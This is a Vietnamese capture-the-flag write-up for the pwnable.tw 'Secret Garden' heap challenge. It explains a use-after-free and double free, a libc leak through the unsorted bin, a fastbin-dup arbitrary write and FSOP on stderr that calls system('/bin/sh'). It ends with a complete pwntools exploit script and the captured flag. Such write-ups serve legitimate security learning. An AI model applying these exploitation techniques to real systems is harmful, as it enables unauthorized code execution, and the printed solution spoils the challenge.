+++
title = 'Pwnable.tw - Secret Garden'
date = 2026-09-19T22:17:26+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Secret Garden

`nc chall.pwnable.tw 10203`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Secret Garden/secretgarden_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
```

libc đi kèm là `Ubuntu GLIBC 2.23-0ubuntu5` - chưa có `tcache`, chưa có `safe-linking`, và quan trọng nhất là **chưa có vtable validation cho `_IO_FILE`**.

Menu quản lý hoa, mỗi flower là một struct `0x28` bytes:

```c
+0x00  unsigned int flag;    // 1 = còn sống
+0x08  char *name;           // chunk riêng, size do user chọn
+0x10  char color[24];
```

Global: mảng con trỏ struct ở `PIE+0x202040` (100 slot) và counter ở `PIE+0x202024`.

Các chức năng:

| Option | Hành vi |
|---|---|
| 1 Raise | `malloc(0x28)` struct, `malloc(len)` name, `read(0, name, len)`, `scanf("%23s", struct+0x10)`, `flag = 1` |
| 2 Visit | với mỗi flower còn sống: `printf("%s", struct->name)` và `printf("%s", struct+0x10)` |
| 3 Remove | `struct->flag = 0; free(struct->name);` |
| 4 Clean | free các struct có `flag == 0` rồi set slot về `NULL` |

#### Use-After-Free / Double Free

`Remove` chỉ `free(struct->name)` và set `flag = 0`, **không set `struct->name = NULL`, cũng không xoá slot trong mảng**. Hệ quả:

- Free lại cùng một name chunk nhiều lần → fastbin double free.
- `Visit` vẫn `%s` được name đã free → primitive đọc.

### 2. Khai thác

Cần 3 thứ: leak libc, ghi tùy ý, và code execution trong điều kiện `Full RELRO` (không ghi được GOT).

#### Leak libc qua Unsorted Bin

Free một name chunk lớn hơn tầm fastbin (`len = 0x100` → chunk `0x110`) để nó vào `unsorted bin`. Sau đó xin lại đúng size đó làm name nhưng **chỉ gửi 1 byte**: `read` trả về ngay, phần `fd`/`bk` cũ còn nguyên phía sau byte đó. `Visit` in `%s` sẽ lôi nguyên con trỏ ra.

```py
add(0x100, b'A' * 8, b'c0')        # name chunk 0x110
add(0x28,  b'B' * 8, b'c1')        # chặn name0 khỏi dính top
remove(1)                          # name1 (0x30) -> fastbin
remove(0)                          # name0 (0x110) -> unsorted bin
add(0x100, b'X', b'c2')            # struct lấy từ fastbin, name = chunk unsorted
out = visit()
```

Đo qua nhiều lần chạy thì `fd` leak ra luôn bằng `libc_base + 0x3c3b58`, byte thấp là `0x58`. Byte đó bị chính byte `X` ta gửi đè, nhưng vì nó là hằng số nên ghép lại được:

```py
val = 0x58
for i, b in enumerate(raw[1:6], start=1):
    val |= b << (8 * i)
base = val - UNSORTED_OFF          # 0x3c3b58
```

Thêm 2 điều kiện sanity để loại các lần leak lỗi: `base & 0xfff == 0` và `base` nằm trong vùng `0x7f...`.

#### Arbitrary write bằng Fastbin Dup

Name dài `0x68` cho ra chunk `0x70`, nằm trong fastbin index 5. Free theo thứ tự `0 → 1 → 0` tạo vòng `A → B → A`:

```py
remove(0)
remove(1)
remove(0)
add(0x68, p64(target_fd), b'g1')   # lấy lại A, ghi fd = fake chunk
add(0x68, b'x' * 8, b'g2')         # lấy B
add(0x68, b'x' * 8, b'g3')         # lấy A
add(0x68, payload, b'g4')          # lấy fake chunk -> ghi payload
```

Chỗ dễ sai nhất: giá trị nhồi vào `fd` phải là địa chỉ **chunk**, không phải địa chỉ user. `malloc` trả về `fake_chunk + 0x10`, và `fake_chunk + 8` phải chứa một size hợp lệ cho fastbin. Đưa sai thành địa chỉ user thì nhận ngay `malloc(): memory corruption (fast)`.

#### Code execution bằng FSOP trên stderr

Hai hướng quen thuộc đều tắc:

- `__free_hook` không với tới được: trong cửa sổ `0x68` bytes quanh nó không có size nào hợp lệ để dựng fake chunk.
- one_gadget tại `__malloc_hook` fail: kiểm tra trong gdb thì tại thời điểm gọi hook, `rax`, `[rsp+0x30]`, `[rsp+0x50]`, `[rsp+0x70]` đều khác `NULL`.

Nhưng glibc 2.23 không validate vtable, nên đi FSOP. `_IO_list_all` trỏ tới `_IO_2_1_stderr_` đầu tiên; `exit(0)` sẽ chạy `__run_exit_handlers` → `_IO_cleanup` → `_IO_flush_all_lockp(0)`, và với mỗi stream có `_mode <= 0` và `_IO_write_ptr > _IO_write_base` thì nó gọi `*(fp->vtable + 0x18)(fp, -1)`.

Vậy chỉ cần biến `stderr` thành fake `_IO_FILE`:

```js
stderr + 0x00  = "/bin/sh\0"      <- vừa là _flags, vừa là tham số cho system
stderr + 0x20  = 0                 _IO_write_base
stderr + 0x28  = 1                 _IO_write_ptr  (> write_base)
stderr + 0xc0  = 0                 _mode
stderr + 0xd8  = V                 vtable -> fake vtable
V      + 0x18  = system            slot __overflow
```

Khi flush, nó gọi `system(stderr)` = `system("/bin/sh")`.

Hai lần ghi `0x68` bytes là đủ:

| write | fake chunk | user ptr | ghi gì |
|---|---|---|---|
| 1 | `base+0x3c44fd` | `base+0x3c450d` | `_IO_list_all = &stderr`; `stderr` flags `"/bin/sh\0"`, `write_base = 0`, `write_ptr = 1` |
| 2 | `base+0x3c45dd` | `base+0x3c45ed` | `stderr._mode = 0`, `stderr.vtable = V`, `[V+0x18] = system`, dựng lại head của `stdout` |

Cả hai target đều có `*(user) == 0` nên sau khi ghi, head của fastbin về `NULL`, chain sạch và lần dup thứ hai an toàn. Nếu để lại giá trị rác ở head thì lần `malloc` cùng size kế tiếp sẽ crash.

#### Các giá trị đo được

```js
UNSORTED_OFF        = 0x3c3b58      (base = leaked_fd - offset này)
_IO_list_all        = 0x3c4520
_IO_2_1_stderr_     = 0x3c4540
_IO_2_1_stdout_     = 0x3c4620
_IO_flush_all_lockp = 0x7c020
system              = 0x45390
fake user ptr #1    = 0x3c450d
fake user ptr #2    = 0x3c45ed
```

gdb xác nhận lệnh gọi cuối: `__libc_system (line=stderr "/bin/sh")`.

Local chạy 8/8 lần ra shell. Remote:

```bash
$ ls home
secretgarden
$ cat home/secretgarden/flag
FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}
```

`FLAG: FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}`

```py
#!/usr/bin/env python3
from pwn import *
import time

exe = ELF('./secretgarden_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)

UNSORTED_OFF = 0x3c3b58        # leaked fd == libc_base + this (measured)
LIST_ALL_OFF = 0x3c4520        # _IO_list_all
STDERR_OFF   = 0x3c4540        # _IO_2_1_stderr_
STDOUT_OFF   = 0x3c4620
SYS_OFF      = libc.symbols['system']
W1_USER      = 0x3c450d        # fake-chunk user ptr #1
W2_USER      = 0x3c45ed        # fake-chunk user ptr #2
FAKE_VT      = W2_USER

def menu():
    p.recvuntil(b'Your choice : ')

def _add_tail(length, name, color, wait=True):
    p.recvuntil(b'Length of the name :')
    p.send(str(length).encode() + b'\n')
    p.recvuntil(b'The name of flower :')
    p.send(name)
    p.recvuntil(b'The color of the flower :')
    p.send(color + b'\n')
    if wait:
        p.recvuntil(b'Successful !')

def add(length, name=b'', color=b'x', wait=True):
    menu()
    p.send(b'1\n')
    _add_tail(length, name, color, wait)

def remove(idx, wait=True):
    menu()
    p.send(b'3\n')
    p.recvuntil(b'garden:')
    p.send(str(idx).encode() + b'\n')
    time.sleep(0.05)
    if wait:
        try: p.recvuntil(b'Successful', timeout=1)
        except Exception: pass

def clean_raw():
    p.send(b'4\n')
    time.sleep(0.05)
    p.recvuntil(b'Done!')

def visit():
    menu()
    p.send(b'2\n')
    time.sleep(0.15)
    return p.recv(timeout=0.6)

def make_img(base_off, fields):
    img = bytearray(b'\x00' * 0x68)
    for ao, data in fields:
        o = ao - base_off
        if 0 <= o and o + len(data) <= 0x68:
            img[o:o+len(data)] = data
    return bytes(img)

def poison_write(target_fd, payload):
    add(0x68, b'a' * 8, b'ca')
    add(0x68, b'b' * 8, b'cb')
    add(0x10, b'c' * 8, b'cc')
    remove(0)
    remove(1)
    remove(0)
    add(0x68, p64(target_fd), b'g1')   # pop nameA, plant fd = fake chunk
    add(0x68, b'x' * 8, b'g2')         # pop nameB
    add(0x68, b'x' * 8, b'g3')         # pop nameA
    add(0x68, payload, b'g4')          # pop fake chunk -> write payload

def leak_libc():
    add(0x100, b'A' * 8, b'c0')        # name chunk 0x110
    add(0x28,  b'B' * 8, b'c1')
    remove(1)                          # name1 (0x30) -> fastbin
    remove(0)                          # name0 (0x110) -> unsorted bin
    add(0x100, b'X', b'c2', wait=False)
    time.sleep(0.1)
    p.recvuntil(b'Successful !')
    out = visit()
    raw = out.split(b'Name of the flower[2] :')[1].split(b'\n')[0]
    if len(raw) < 6:
        return None
    val = 0x58                          # known low byte of the unsorted fd
    for i, b in enumerate(raw[1:6], start=1):
        val |= b << (8 * i)
    base = val - UNSORTED_OFF
    if base & 0xfff:
        return None
    if not (0x700000000000 <= base <= 0x7fffffffffff):
        return None
    return base

def attempt():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10203)
    return process([exe.path])

def solve():
    global p
    for tries in range(8):
        try:
            p = attempt()
        except Exception as e:
            log.warning('connect failed: %r' % e)
            continue
        p.timeout = 2.0
        try:
            base = leak_libc()
            if base is None:
                log.warning('attempt %d: bad leak' % tries)
                p.close(); continue
            info('libc_base = %#x' % base)
            clean_raw()
            S = base + STDERR_OFF
            V = base + FAKE_VT
            sysa = base + SYS_OFF
            rp = base + 0x3c46a3           # stdout read/write pointer (measured)

            img1 = make_img(base + W1_USER, [
                (base + LIST_ALL_OFF, p64(S)),
                (S + 0x00, b'/bin/sh\x00'),
                (S + 0x08, p64(0)), (S + 0x10, p64(0)), (S + 0x18, p64(0)),
                (S + 0x20, p64(0)),        # _IO_write_base = 0
                (S + 0x28, p64(1)),        # _IO_write_ptr  = 1
                (S + 0x30, p32(0)),
            ])
            poison_write(base + W1_USER - 0x10, img1)

            img2 = make_img(base + W2_USER, [
                (S + 0xc0, p64(0)),        # _mode = 0
                (V + 0x18, p64(sysa)),     # fake vtable __overflow = system
                (S + 0xd8, p64(V)),        # stderr vtable = V
                (base + STDOUT_OFF + 0x00, p32(0xfbad2887)),
                (base + STDOUT_OFF + 0x08, p64(rp)),
                (base + STDOUT_OFF + 0x10, p64(rp)),
                (base + STDOUT_OFF + 0x18, p64(rp)),
                (base + STDOUT_OFF + 0x20, p64(rp)),
                (base + STDOUT_OFF + 0x28, p64(rp)),
                (base + STDOUT_OFF + 0x30, rp.to_bytes(6, 'little')),
            ])
            poison_write(base + W2_USER - 0x10, img2)

            time.sleep(0.2)
            p.sendline(b'5')              # exit -> _IO_cleanup -> system("/bin/sh")
            time.sleep(0.6)
            try: p.recv(timeout=1)
            except Exception: pass
            p.sendline(b'id')
            time.sleep(0.4)
            data = p.recv(timeout=3)
            if b'uid=' in data:
                log.success('shell obtained')
                return p
            log.warning('attempt %d: no shell' % tries)
            p.close()
        except Exception as e:
            log.warning('attempt %d failed: %r' % (tries, e))
            try: p.close()
            except Exception: pass
    return None

if __name__ == '__main__':
    p = solve()
    if p is None:
        log.failure('exploit failed')
        raise SystemExit(1)
    p.interactive()
```
